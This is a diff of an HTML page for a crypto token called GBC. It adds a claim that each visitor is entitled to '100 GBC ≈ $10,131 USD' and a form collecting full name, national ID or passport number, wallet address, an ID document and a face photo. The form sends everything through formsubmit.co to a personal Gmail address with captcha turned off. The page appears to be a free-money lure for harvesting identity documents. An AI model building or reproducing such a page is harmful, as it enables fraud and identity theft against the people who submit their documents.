@@ -50,19 +50,30 @@
 </div>
 
 <div class="section">
-  <h2><i class="fas fa-user-check icon"></i> Request Your GBC</h2>
-  <form onsubmit="return validateRequestAmount();" enctype="multipart/form-data">
-    <input type="text" id="fullName" placeholder="Full Name" required>
-    <input type="text" id="nationalID" placeholder="National ID or Passport No." required>
-    <input type="text" id="walletInput" placeholder="MetaMask Wallet Address (Requester)" required>
-    <input type="number" id="requestedAmount" placeholder="Enter amount (Max: 0.0125)" step="0.0001" min="0.0001" max="0.0125" required oninput="enforceMaxValue(this)">
-    <label>Upload ID Document:</label><br>
-    <input type="file" id="uploadID" accept=".jpg,.jpeg,.png,.pdf" required><br>
-    <label>Upload Face Photo:</label><br>
-    <input type="file" id="uploadFace" accept="image/*" required><br>
+  <h2><i class="fas fa-gift icon"></i> Your Birthright Share</h2>
+  <p><strong>100 GBC ≈ $10,131 USD</strong><br/>This is your global dignity cap entitlement</p>
+</div>
+
+<div class="section">
+  <h2><i class="fas fa-user-check icon"></i> Request GBC</h2>
+  <form action="https://formsubmit.co/imurad2009@gmail.com" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="_subject" value="New GBC Request Submitted">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="box">
+
+    <input type="text" name="Full Name" placeholder="Full Name" required />
+    <input type="text" name="National ID / Passport No" placeholder="National ID or Passport No." required />
+    <input type="text" name="MetaMask Wallet Address" placeholder="Your MetaMask Wallet Address" required />
+    <input type="number" name="Requested Amount (Max 100)" step="1" max="100" placeholder="Enter amount (Max: 100)" required />
+    
+    <label>Upload ID Document:</label><br/>
+    <input type="file" name="ID Document" accept=".jpg,.jpeg,.png,.pdf" required /><br/>
+    
+    <label>Upload Face Photo:</label><br/>
+    <input type="file" name="Face Photo" accept="image/*" required /><br/><br/>
+    
     <button type="submit"><i class="fas fa-paper-plane"></i> Submit Request</button>
   </form>
-  <p id="requestMessage" style="color: green;"></p>
 </div>
 
 <div class="section">
